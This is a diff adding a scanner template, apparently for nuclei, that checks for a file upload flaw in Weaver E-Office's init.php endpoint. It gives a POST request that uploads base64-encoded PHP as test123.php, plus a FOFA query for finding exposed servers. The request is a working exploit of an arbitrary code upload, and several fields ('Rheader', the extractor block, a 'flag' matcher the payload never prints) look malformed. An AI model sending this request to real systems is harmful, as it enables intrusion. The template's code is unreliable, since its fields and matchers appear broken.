@@ -1,0 +1,50 @@
+id: 泛微E-Office FlowCommon.php文件上传漏洞
+time: '2023-05-17'
+
+
+info:
+  name: FlowCommon.php存在文件上传漏洞
+  severity: high
+  description: E-office /E-mobile/App/Flow/Common/common/FlowCommon.class.php 存在文件上传漏洞,攻击者可利用该漏洞获取系统敏感信息等
+  reference: https://github.com/sunyixuan1228/cve/blob/main/weaver.md
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/E-mobile/App/init.php"
+
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded;
+        
+    body: 
+      - |
+        m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=test123.php
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag"
+          - "test123.php"
+          - "?diff="
+      - type: status
+        status:
+          - 200
+    
+    extractors:
+      - name: 
+          - path
+        part: 
+          - path
+        time: 
+          - 1
+        regex:
+          - '(.*)'
